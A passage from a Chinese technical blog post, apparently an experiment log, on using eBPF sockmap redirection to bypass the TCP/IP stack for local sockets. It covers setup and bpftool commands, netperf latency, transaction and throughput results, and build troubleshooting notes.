title="利用eBPF提升socket性能"></a>利用eBPF提升socket性能</h4><h5 id="实验介绍"><a href="#实验介绍" class="headerlink" title="实验介绍"></a>实验介绍</h5><p>本实验主要是利用ebpf sockmap/redirection来提升socket的性能。sockmap是 eBPF 提供的一个特殊的<code>eBPF MAP</code>类型，主要用于socket redirection，在 socket redirection中，socket被添加到sockmap中并由key（主要是四元组）引用，然后该 socket 在调用<code>bpf_sockmap_redirect()</code>时进行重定向。对于本地通信方式而言，这样可以绕过整个 TCP/IP 协议栈，直接将数据发送到 socket 对端，从而提高性能。</p><h5 id="实验代码"><a href="#实验代码" class="headerlink" title="实验代码"></a>实验代码</h5><p><a href="https://github.com/cyralinc/os-eBPF" target="_blank" rel="noopener">https://github.com/cyralinc/os-eBPF</a></p><h5 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h5><ul><li>Ubuntu Linux 18.04 with 5.3.0-40-generic</li></ul><h5 id="实验准备"><a href="#实验准备" class="headerlink" title="实验准备"></a>实验准备</h5><h6 id="安装相应包"><a href="#安装相应包" class="headerlink" title="安装相应包"></a>安装相应包</h6><ul><li>sudo apt-get install -y make gcc libssl-dev bc libelf-dev libcap-dev clang gcc-multilib llvm libncurses5-dev git pkg-config libmnl-dev bison flex graphviz</li><li>sudo apt-get install iproute2</li><li>sudo apt install libbfd-dev libcap-dev zlib1g-dev libelf-dev libssl-dev</li></ul><h6 id="修改apt源"><a href="#修改apt源" class="headerlink" title="修改apt源"></a>修改apt源</h6><p><a href="https://blog.csdn.net/weixin_44143222/article/details/88592193" target="_blank" rel="noopener">https://blog.csdn.net/weixin_44143222/article/details/88592193</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get source linux-image-$(uname -r)</span><br><span class="line">apt-get source linux-image-unsigned-$(uname -r)</span><br></pre></td></tr></table></figure><h6 id="或直接下载对应源码"><a href="#或直接下载对应源码" class="headerlink" title="或直接下载对应源码"></a>或直接下载对应源码</h6><ul><li><a href="https://mirrors.edge.kernel.org/pub/linux/kernel/" target="_blank" rel="noopener">https://mirrors.edge.kernel.org/pub/linux/kernel/</a></li></ul><h6 id="编译-bpftool-工具"><a href="#编译-bpftool-工具" class="headerlink" title="编译 bpftool 工具"></a>编译 bpftool 工具</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd linux-5.3/tools/bpf/bpftool</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure><h6 id="编译bpf字节码"><a href="#编译bpf字节码" class="headerlink" title="编译bpf字节码"></a>编译bpf字节码</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/os-eBPF/sockredir$ clang -O2 -g -target bpf -I /usr/include/linux/ -I /usr/src/linux-headers-5.3.0-40/include/ -c bpf_sockops_v4.c  -o bpf_sockops_v4.o</span><br></pre></td></tr></table></figure><h6 id="加载bpf字节码"><a href="#加载bpf字节码" class="headerlink" title="加载bpf字节码"></a>加载bpf字节码</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/os-eBPF/sockredir$ sudo bpftool prog load bpf_sockops_v4.o "/sys/fs/bpf/bpf_sockops"</span><br><span class="line">root@ubuntu:~/os-eBPF/sockredir$ sudo bpftool cgroup attach "/sys/fs/cgroup/unified/" sock_ops pinned "/sys/fs/bpf/bpf_sockops"</span><br></pre></td></tr></table></figure><h6 id="查看系统中已经加载的所有-BPF-程序"><a href="#查看系统中已经加载的所有-BPF-程序" class="headerlink" title="查看系统中已经加载的所有 BPF 程序"></a>查看系统中已经加载的所有 BPF 程序</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/os-eBPF/sockredir$ sudo bpftool prog show</span><br><span class="line">2: cgroup_skb  tag 7be49e3934a125ba  gpl</span><br><span class="line">loaded_at 2022-01-26T08:39:44+0000  uid 0</span><br><span class="line">xlated 296B  jited 200B  memlock 4096B  map_ids 2,3</span><br><span class="line">3: cgroup_skb  tag 2a142ef67aaad174  gpl</span><br><span class="line">loaded_at 2022-01-26T08:39:44+0000  uid 0</span><br><span class="line">xlated 296B  jited 200B  memlock 4096B  map_ids 2,3</span><br><span class="line">4: cgroup_skb  tag 7be49e3934a125ba  gpl</span><br><span class="line">loaded_at 2022-01-26T08:39:44+0000  uid 0</span><br><span class="line">xlated 296B  jited 200B  memlock 4096B  map_ids 4,5</span><br><span class="line">5: cgroup_skb  tag 2a142ef67aaad174  gpl</span><br><span class="line">loaded_at 2022-01-26T08:39:44+0000  uid 0</span><br><span class="line">xlated 296B  jited 200B  memlock 4096B  map_ids 4,5</span><br><span class="line">6: cgroup_skb  tag 7be49e3934a125ba  gpl</span><br><span class="line">loaded_at 2022-01-26T08:41:20+0000  uid 0</span><br><span class="line">xlated 296B  jited 200B  memlock 4096B  map_ids 6,7</span><br><span class="line">7: cgroup_skb  tag 2a142ef67aaad174  gpl</span><br><span class="line">loaded_at 2022-01-26T08:41:20+0000  uid 0</span><br><span class="line">xlated 296B  jited 200B  memlock 4096B  map_ids 6,7</span><br><span class="line">18: sock_ops  name bpf_sockops_v4  tag 8fb64d4d0f48a1a4  gpl</span><br><span class="line">loaded_at 2022-01-26T08:59:51+0000  uid 0</span><br><span class="line">xlated 688B  jited 399B  memlock 4096B  map_ids 14</span><br></pre></td></tr></table></figure><h6 id="查看系统中所有的-map"><a href="#查看系统中所有的-map" class="headerlink" title="查看系统中所有的 map"></a>查看系统中所有的 map</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/os-eBPF/sockredir$ sudo bpftool map show</span><br><span class="line">2: lpm_trie  flags 0x1</span><br><span class="line">key 8B  value 8B  max_entries 1  memlock 4096B</span><br><span class="line">3: lpm_trie  flags 0x1</span><br><span class="line">key 20B  value 8B  max_entries 1  memlock 4096B</span><br><span class="line">4: lpm_trie  flags 0x1</span><br><span class="line">key 8B  value 8B  max_entries 1  memlock 4096B</span><br><span class="line">5: lpm_trie  flags 0x1</span><br><span class="line">key 20B  value 8B  max_entries 1  memlock 4096B</span><br><span class="line">6: lpm_trie  flags 0x1</span><br><span class="line">key 8B  value 8B  max_entries 1  memlock 4096B</span><br><span class="line">7: lpm_trie  flags 0x1</span><br><span class="line">key 20B  value 8B  max_entries 1  memlock 4096B</span><br><span class="line">14: sockhash  name sock_ops_map  flags 0x0</span><br><span class="line">key 24B  value 4B  max_entries 65535  memlock 0B</span><br></pre></td></tr></table></figure><h6 id="查看map的详情"><a href="#查看map的详情" class="headerlink" title="查看map的详情"></a>查看map的详情</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~$ sudo bpftool -p map show id 14</span><br><span class="line">&#123;</span><br><span class="line">    "id": 14,</span><br><span class="line">    "type": "sockhash",</span><br><span class="line">    "name": "sock_ops_map",</span><br><span class="line">    "flags": 0,</span><br><span class="line">    "bytes_key": 24,</span><br><span class="line">    "bytes_value": 4,</span><br><span class="line">    "max_entries": 65535,</span><br><span class="line">    "bytes_memlock": 0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="打印map中的内容"><a href="#打印map中的内容" class="headerlink" title="打印map中的内容"></a>打印map中的内容</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~$ sudo bpftool -p map dump id 14</span><br><span class="line">[&#123;</span><br><span class="line">        "key": ["0xc0","0xa8","0x13","0x55","0x0a","0x34","0x23","0xa1","0x01","0x00","0x00","0x00","0x00","0x00","0x00","0x00","0x00","0x16","0x00","0x00","0xc4","0x08","0x00","0x00"</span><br><span class="line">        ],</span><br><span class="line">        "value": &#123;</span><br><span class="line">            "error": "Operation not supported"</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h5 id="具体测试步骤"><a href="#具体测试步骤" class="headerlink" title="具体测试步骤"></a>具体测试步骤</h5><h6 id="执行load-sh脚本"><a href="#执行load-sh脚本" class="headerlink" title="执行load.sh脚本"></a>执行<code>load.sh</code>脚本</h6><p>这里需要根据内核版本对应修改一下<code>load.sh</code>中的代码，如下图所示</p><p><img src="/2022/01/21/浅入浅出eBPF/6.png" alt="6"></p><p>执行结果如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/os-eBPF/sockredir$ ./load.sh </span><br><span class="line">+ set -e</span><br><span class="line">+ sudo mount -t bpf bpf /sys/fs/bpf/</span><br><span class="line">+ clang -O2 -g -target bpf -I/usr/include/linux/ -I/usr/src/linux-headers-5.3.0-40/include/ -c bpf_sockops_v4.c -o bpf_sockops_v4.o</span><br><span class="line">+ sudo bpftool prog load bpf_sockops_v4.o /sys/fs/bpf/bpf_sockops</span><br><span class="line">+ sudo bpftool cgroup attach /sys/fs/cgroup/unified/ sock_ops pinned /sys/fs/bpf/bpf_sockops</span><br><span class="line">++ sudo bpftool prog show pinned /sys/fs/bpf/bpf_sockops</span><br><span class="line">++ grep -o -E 'map_ids [0-9]+'</span><br><span class="line">++ cut -d ' ' -f2-</span><br><span class="line">+ MAP_ID=42</span><br><span class="line">+ sudo bpftool map pin id 42 /sys/fs/bpf/sock_ops_map</span><br><span class="line">+ clang -O2 -g -Wall -target bpf -I/usr/include/linux/ -I/usr/src/linux-headers-5.3.0-40/include/ -c bpf_tcpip_bypass.c -o bpf_tcpip_bypass.o</span><br><span class="line">+ sudo bpftool prog load bpf_tcpip_bypass.o /sys/fs/bpf/bpf_tcpip_bypass map name sock_ops_map pinned /sys/fs/bpf/sock_ops_map</span><br><span class="line">+ sudo bpftool prog attach pinned /sys/fs/bpf/bpf_tcpip_bypass msg_verdict pinned /sys/fs/bpf/sock_ops_map</span><br></pre></td></tr></table></figure><h6 id="确认BPF程序已经被加载进内核"><a href="#确认BPF程序已经被加载进内核" class="headerlink" title="确认BPF程序已经被加载进内核"></a>确认BPF程序已经被加载进内核</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/os-eBPF/sockredir$ sudo bpftool prog show</span><br><span class="line">18: sock_ops  name bpf_sockops_v4  tag 8fb64d4d0f48a1a4  gpl</span><br><span class="line">loaded_at 2022-01-26T08:59:51+0000  uid 0</span><br><span class="line">xlated 688B  jited 399B  memlock 4096B  map_ids 14</span><br><span class="line">41: cgroup_skb  tag 7be49e3934a125ba  gpl</span><br><span class="line">loaded_at 2022-01-27T01:11:55+0000  uid 0</span><br><span class="line">xlated 296B  jited 200B  memlock 4096B  map_ids 35,36</span><br><span class="line">42: cgroup_skb  tag 2a142ef67aaad174  gpl</span><br><span class="line">loaded_at 2022-01-27T01:11:55+0000  uid 0</span><br><span class="line">xlated 296B  jited 200B  memlock 4096B  map_ids 35,36</span><br><span class="line">43: cgroup_skb  tag 7be49e3934a125ba  gpl</span><br><span class="line">loaded_at 2022-01-27T01:11:55+0000  uid 0</span><br><span class="line">xlated 296B  jited 200B  memlock 4096B  map_ids 37,38</span><br><span class="line">44: cgroup_skb  tag 2a142ef67aaad174  gpl</span><br><span class="line">loaded_at 2022-01-27T01:11:55+0000  uid 0</span><br><span class="line">xlated 296B  jited 200B  memlock 4096B  map_ids 37,38</span><br><span class="line">45: cgroup_skb  tag 7be49e3934a125ba  gpl</span><br><span class="line">loaded_at 2022-01-27T01:11:55+0000  uid 0</span><br><span class="line">xlated 296B  jited 200B  memlock 4096B  map_ids 39,40</span><br><span class="line">46: cgroup_skb  tag 2a142ef67aaad174  gpl</span><br><span class="line">loaded_at 2022-01-27T01:11:55+0000  uid 0</span><br><span class="line">xlated 296B  jited 200B  memlock 4096B  map_ids 39,40</span><br><span class="line">50: sock_ops  name bpf_sockops_v4  tag 8fb64d4d0f48a1a4  gpl</span><br><span class="line">loaded_at 2022-01-27T01:32:15+0000  uid 0</span><br><span class="line">xlated 688B  jited 399B  memlock 4096B  map_ids 42</span><br><span class="line">54: sk_msg  name bpf_tcpip_bypas  tag 550f6d3cfcae2157  gpl</span><br><span class="line">loaded_at 2022-01-27T01:32:16+0000  uid 0</span><br><span class="line">xlated 224B  jited 151B  memlock 4096B  map_ids 42</span><br></pre></td></tr></table></figure><h6 id="查看固定在文件系统上的SOCKHASH映射"><a href="#查看固定在文件系统上的SOCKHASH映射" class="headerlink" title="查看固定在文件系统上的SOCKHASH映射"></a>查看固定在文件系统上的SOCKHASH映射</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/os-eBPF/sockredir$ sudo tree /sys/fs/bpf/</span><br><span class="line">/sys/fs/bpf/</span><br><span class="line">├── bpf_sockops</span><br><span class="line">├── bpf_tcpip_bypass</span><br><span class="line">└── sock_ops_map</span><br><span class="line"></span><br><span class="line">0 directories, 3 files</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/os-eBPF/sockredir$ sudo bpftool map show id 42 -f</span><br><span class="line">42: sockhash  name sock_ops_map  flags 0x0</span><br><span class="line">key 24B  value 4B  max_entries 65535  memlock 0B</span><br></pre></td></tr></table></figure><h6 id="确认应用程序绕过TCP-IP协议栈"><a href="#确认应用程序绕过TCP-IP协议栈" class="headerlink" title="确认应用程序绕过TCP/IP协议栈"></a>确认应用程序绕过TCP/IP协议栈</h6><p>首先打开日志追踪</p><p>root模式下执行如下命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/os-eBPF/sockredir# echo 1 &gt; /sys/kernel/debug/tracing/tracing_on</span><br></pre></td></tr></table></figure><p>接着在shell中对内核实时流跟踪文件trace_pipe进行cat查询，用来监视通过eBPF的TCP通信</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/os-eBPF/sockredir# cat /sys/kernel/debug/tracing/trace_pipe</span><br><span class="line">          &lt;idle&gt;-0     [001] ..s. 30406.252054: 0: &lt;&lt;&lt; ipv4 op = 4, port 47750 --&gt; 443</span><br><span class="line">          &lt;idle&gt;-0     [001] ..s. 32211.552998: 0: &lt;&lt;&lt; ipv4 op = 4, port 46724 --&gt; 443</span><br><span class="line">          &lt;idle&gt;-0     [001] ..s. 44205.364961: 0: &lt;&lt;&lt; ipv4 op = 4, port 36448 --&gt; 443</span><br><span class="line">          &lt;idle&gt;-0     [000] ..s. 57704.968149: 0: &lt;&lt;&lt; ipv4 op = 4, port 60816 --&gt; 443</span><br></pre></td></tr></table></figure><p>使用socat生成的TCP监听器模拟echo服务器，并使用nc发送连接请求</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~$ sudo socat TCP4-LISTEN:9999,fork exec:cat</span><br><span class="line">root@ubuntu:~$ nc localhost 9999</span><br></pre></td></tr></table></figure><p>随后我们就可以在内核追踪管道中看到在eBPF程序打印的日志</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/os-eBPF/sockredir# cat /sys/kernel/debug/tracing/trace_pipe</span><br><span class="line">          &lt;idle&gt;-0     [003] ..s. 61937.626701: 0: &lt;&lt;&lt; ipv4 op = 5, port 22 --&gt; 51324</span><br><span class="line">              nc-4486  [001] .... 61949.838226: 0: &lt;&lt;&lt; ipv4 op = 4, port 43062 --&gt; 9999</span><br><span class="line">              nc-4486  [001] .Ns1 61949.838279: 0: &lt;&lt;&lt; ipv4 op = 5, port 9999 --&gt; 43062</span><br></pre></td></tr></table></figure><h6 id="代码步骤梳理"><a href="#代码步骤梳理" class="headerlink" title="代码步骤梳理"></a>代码步骤梳理</h6><ul><li><code>bpf_sockops_v4.c</code><ul><li>监听<code>socket</code>事件，当事件触发的时候执行</li><li>提取 socket 信息，并以 key &amp; value 形式存储到 sockmap</li></ul></li><li><code>bpf_tcpip_bypass.c</code><ul><li>拦截所有的 <code>sendmsg</code> 系统调用，从消息中提取 key</li><li>根据key查询sockmap，找到这个socket的对端，然后绕过 TCP/IP 协议栈，将数据重定向</li></ul></li></ul><h5 id="网络延迟测试"><a href="#网络延迟测试" class="headerlink" title="网络延迟测试"></a>网络延迟测试</h5><p>使用<code>netperf</code>命令，执行时长参数为60秒的各种请求和响应消息大小，进行延迟测量（分别采用p50、p90 和 p99，其中P50表示中位数。P90表示包含90%的值。P99表示包含99%的值。）：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~$ netserver -p 1000</span><br><span class="line">Unable to start netserver with  'IN(6)ADDR_ANY' port '1000' and family AF_UNSPEC</span><br></pre></td></tr></table></figure><p>这里是因为端口被占用的问题，我们换一个端口即可</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~$ sudo netserver -p 9998</span><br><span class="line">Starting netserver with host 'IN(6)ADDR_ANY' port '9998' and family AF_UNSPEC</span><br></pre></td></tr></table></figure><p>执行<code>nperf_latency.sh</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/os-eBPF/sockredir# ./nperf_latency.sh</span><br></pre></td></tr></table></figure><p>查看结果</p><p>其中第一行和第三行是原生TCP的网络延迟，第二行和第四行是eBPF重定向之后的网络延迟</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/os-eBPF/sockredir$ cat result_lat.txt </span><br><span class="line">Req/Resp size: 64 128</span><br><span class="line">45,89,117</span><br><span class="line">17,51,69</span><br><span class="line">46,89,125</span><br><span class="line">26,48,70</span><br><span class="line"></span><br><span class="line">Req/Resp size: 64 256</span><br><span class="line">75,101,129</span><br><span class="line">18,48,71</span><br><span class="line">65,101,134</span><br><span class="line">23,58,81</span><br><span class="line"></span><br><span class="line">Req/Resp size: 64 512</span><br><span class="line">52,103,139</span><br><span class="line">20,60,85</span><br><span class="line">58,105,143</span><br><span class="line">16,57,77</span><br><span class="line"></span><br><span class="line">Req/Resp size: 64 1024</span><br><span class="line">64,109,149</span><br><span class="line">14,58,79</span><br><span class="line">99,113,152</span><br><span class="line">22,63,86</span><br><span class="line"></span><br><span class="line">Req/Resp size: 64 2048</span><br><span class="line">79,109,148</span><br><span class="line">23,64,86</span><br><span class="line">73,105,139</span><br><span class="line">25,63,87</span><br><span class="line"></span><br><span class="line">Req/Resp size: 64 4096</span><br><span class="line">88,114,144</span><br><span class="line">19,62,81</span><br><span class="line">51,107,144</span><br><span class="line">22,65,90</span><br><span class="line"></span><br><span class="line">Req/Resp size: 64 8192</span><br><span class="line">53,110,149</span><br><span class="line">24,69,93</span><br><span class="line">53,114,148</span><br><span class="line"></span><br><span class="line">Req/Resp size: 64 16384</span><br><span class="line">58,118,156</span><br><span class="line">98,126,159</span><br><span class="line"></span><br><span class="line">Req/Resp size: 64 32768</span><br><span class="line">48,124,157</span><br><span class="line">18,45,104</span><br><span class="line">44,125,158</span><br><span class="line">19,83,111</span><br></pre></td></tr></table></figure><h5 id="网络事务测试"><a href="#网络事务测试" class="headerlink" title="网络事务测试"></a>网络事务测试</h5><p>使用<code>netperf</code>命令来测试60秒运行的各种请求和响应消息大小的事务率：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/os-eBPF/sockredir$ ./nperf_trans.sh</span><br></pre></td></tr></table></figure><p>查看结果</p><p>第一行为原生TCP的事务率，第二行是eBPF重定向之后的事务率</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">Req/Resp size: 64 128</span><br><span class="line">12.8764</span><br><span class="line">37.7448</span><br><span class="line"></span><br><span class="line">Req/Resp size: 64 256</span><br><span class="line">15.4409</span><br><span class="line">26.7399</span><br><span class="line"></span><br><span class="line">Req/Resp size: 64 512</span><br><span class="line">19.6885</span><br><span class="line">51.1781</span><br><span class="line"></span><br><span class="line">Req/Resp size: 64 1024</span><br><span class="line">19.7911</span><br><span class="line">54.3722</span><br><span class="line"></span><br><span class="line">Req/Resp size: 64 2048</span><br><span class="line">16.2438</span><br><span class="line">48.3493</span><br><span class="line"></span><br><span class="line">Req/Resp size: 64 4096</span><br><span class="line">17.0712</span><br><span class="line">39.6384</span><br><span class="line"></span><br><span class="line">Req/Resp size: 64 8192</span><br><span class="line">19.775</span><br><span class="line"></span><br><span class="line">Req/Resp size: 64 16384</span><br><span class="line">14.8864</span><br><span class="line">26.6844</span><br><span class="line"></span><br><span class="line">Req/Resp size: 64 32768</span><br><span class="line">12.8528</span><br><span class="line">42.2359</span><br></pre></td></tr></table></figure><h5 id="网络吞吐测试"><a href="#网络吞吐测试" class="headerlink" title="网络吞吐测试"></a>网络吞吐测试</h5><p>使用<code>netserver</code>服务端和<code>netperf</code>客户端进行60秒的各种发送消息大小的吞吐量测试：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/os-eBPF/sockredir$ ./nperf_thruput.sh</span><br></pre></td></tr></table></figure><p>查看结果</p><p>第一行为原生TCP的吞吐量，第二行是eBPF重定向之后的吞吐量</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">30 tx=256 rx=256</span><br><span class="line">0.3601</span><br><span class="line">0.66732</span><br><span class="line">60 tx=256 rx=256</span><br><span class="line">0.36194</span><br><span class="line">0.66343</span><br><span class="line"></span><br><span class="line">30 tx=512 rx=512</span><br><span class="line">0.70011</span><br><span class="line">1.35457</span><br><span class="line">60 tx=512 rx=512</span><br><span class="line">0.73094</span><br><span class="line">1.26444</span><br><span class="line"></span><br><span class="line">30 tx=1024 rx=1024</span><br><span class="line">1.16659</span><br><span class="line">2.3709</span><br><span class="line">60 tx=1024 rx=1024</span><br><span class="line">1.05398</span><br><span class="line">2.27725</span><br><span class="line"></span><br><span class="line">30 tx=2048 rx=2048</span><br><span class="line">2.40606</span><br><span class="line">4.071</span><br><span class="line">60 tx=2048 rx=2048</span><br><span class="line">1.91763</span><br><span class="line">4.04238</span><br><span class="line"></span><br><span class="line">30 tx=3072 rx=3072</span><br><span class="line">3.34056</span><br><span class="line">5.38908</span><br><span class="line">60 tx=3072 rx=3072</span><br><span class="line">3.41499</span><br><span class="line">5.47481</span><br></pre></td></tr></table></figure><h5 id="遇到的一些问题"><a href="#遇到的一些问题" class="headerlink" title="遇到的一些问题"></a>遇到的一些问题</h5><h6 id="编译bpftool工具出错"><a href="#编译bpftool工具出错" class="headerlink" title="编译bpftool工具出错"></a>编译bpftool工具出错</h6><p>在<code>/tools/bpf/bpftool</code>目录下执行make时会自动检查系统特征，而对于<code>libbfd</code>库，linux内核为<code>4.x</code>的版本是检测不到的。在<code>5.3</code>版本下会显示<code>on</code></p><h6 id="编译bpf字节码出错"><a href="#编译bpf字节码出错" class="headerlink" title="编译bpf字节码出错"></a>编译bpf字节码出错</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/os-eBPF/sockredir$ clang -O2 -g -target bpf -I /usr/include/linux/ -I /usr/src/linux-headers-4.18.0-13/include/ -c bpf_sockops_v4.c  -o bpf_sockops_v4.o</span><br></pre></td></tr></table></figure><p>具体表现在clang编译的时候会报错<code>use of undeclared identifier BPF_XXX</code>，这里需要注意一下，对于bpf中的一些函数也有内核版本的限制，具体的版本可以参考如下链接</p><p>BPF Features by Linux Kernel Version</p><ul><li><a href="https://github.com/delphix/bcc/blob/master/docs/kernel-versions.md" target="_blank" rel="noopener">https://github.com/delphix/bcc/blob/master/docs/kernel-versions.md</a></li></ul><h6 id="加载bpf字节码出错"><a href="#加载bpf字节码出错" class="headerlink" 